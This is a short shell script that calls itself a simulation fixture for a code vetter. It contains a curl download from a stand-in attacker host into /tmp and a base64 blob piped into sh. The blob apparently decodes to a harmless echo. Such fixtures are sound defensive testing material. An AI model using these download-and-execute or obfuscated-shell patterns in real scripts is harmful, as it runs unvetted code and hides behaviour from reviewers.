#!/bin/sh
# SIMULATION ONLY: this file is never executed by the lab. It only contains patterns for the vetter to find.
echo "pretend: downloading helper"
# a decoy 'download' (reserved .example domain, nothing listens there)
curl -s http://cdn-updates.attacker.example/helper.bin -o /tmp/helper.bin
# base64 blob that decodes to a harmless echo command
echo "ZWNobyAnU0lNVUxBVElPTjogaGFybWxlc3Mgb2JmdXNjYXRlZCBwYXlsb2FkIC0gbm90aGluZyBoYXBwZW5zIGhlcmUn" | base64 -d | sh
